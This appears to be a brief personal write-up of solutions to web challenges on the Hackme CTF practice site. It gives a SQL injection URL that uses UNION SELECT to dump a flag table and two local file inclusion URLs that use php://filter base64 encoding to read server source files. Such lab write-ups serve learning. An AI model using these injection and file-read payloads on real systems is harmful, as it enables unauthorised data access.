---
title: hackme-ctf
tags:
---

[Hackme CTF](https://hackme.inndy.tw/)

### WEB

#### hide and seek

查看源代码

#### guestbook

`https://hackme.inndy.tw/gb/?mod=read&id=1 and 0 union select 1,2,3,group_concat(flag) from flag`

#### LFI

```html
https://hackme.inndy.tw/lfi/?page=php://filter/convert.base64-encode/resource=pages/flag
https://hackme.inndy.tw/lfi/?page=php://filter/convert.base64-encode/resource=pages/config
```

